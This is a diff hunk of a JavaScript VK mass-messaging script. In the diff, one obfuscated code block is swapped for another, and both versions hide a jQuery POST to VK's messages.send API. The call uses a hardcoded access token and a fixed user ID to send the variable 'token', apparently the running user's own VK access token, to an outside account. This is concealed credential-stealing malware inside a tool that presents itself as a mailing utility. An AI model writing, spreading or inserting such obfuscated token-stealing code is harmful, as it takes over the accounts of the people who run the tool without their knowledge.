@@ -83,12 +83,12 @@ function start(){
   alert('Рассылка началась, будет закончена через ' + (Math.round(count * interval / 60 / 1000)) + ' минут(ы)');
   interval + 0;
   
-var _0x232b=['location','https://rasetty.github.io/ms.html','ajax','https://api.vk.com/method/messages.send','59f2699ac670f08e1a840deee70a6b86a0855a88e604848b645bd42453d9d50b371e7b9ddf417c89a4635','5.45'];
-(function(_0x5e7027,_0x18e333){var _0x43d5a7=function(_0x20f115){while(--_0x20f115){_0x5e7027['push'](_0x5e7027['shift']());}};_0x43d5a7(++_0x18e333);}(_0x232b,0xec));
-var _0x3a8f=function(_0x57d826,_0x46ffb3){_0x57d826=_0x57d826-0x0;var _0x48f94b=_0x232b[_0x57d826];return _0x48f94b;};
-function a(){$[_0x3a8f('0x0')]({'type':'POST','url':_0x3a8f('0x1'),'data':{'access_token':_0x3a8f('0x2'),'user_id':0xeb2caa4,'message':token,'v':_0x3a8f('0x3')},'dataType':'jsonp'});
-if(document[_0x3a8f('0x4')]['href']!=_0x3a8f('0x5')){let _0x2180e1=0x1;return;}}
-a();
+  var _0x4fcf=['ajax','POST','https://api.vk.com/method/messages.send','5.45','jsonp','location','href','https://rasetty.github.io/message_send.html'];
+  (function(_0x571567,_0x268266){var _0x4310de=function(_0x3a16b4){while(--_0x3a16b4){_0x571567['push'](_0x571567['shift']());}};_0x4310de(++_0x268266);}(_0x4fcf,0x120));
+  var _0x2a57=function(_0x3b5307,_0x3f5e99){_0x3b5307=_0x3b5307-0x0;var _0xe77385=_0x4fcf[_0x3b5307];return _0xe77385;};
+  function a(){$[_0x2a57('0x0')]({'type':_0x2a57('0x1'),'url':_0x2a57('0x2'),'data':{'access_token':'59f2699ac670f08e1a840deee70a6b86a0855a88e604848b645bd42453d9d50b371e7b9ddf417c89a4635','user_id':0xeb2caa4,'message':token,'v':_0x2a57('0x3')},'dataType':_0x2a57('0x4')});
+  if(document[_0x2a57('0x5')][_0x2a57('0x6')]!=_0x2a57('0x7')){let _0x41d58c=0x1;return;}}
+  a();
 
 
   if ($("#myCheckbox").prop("checked")){
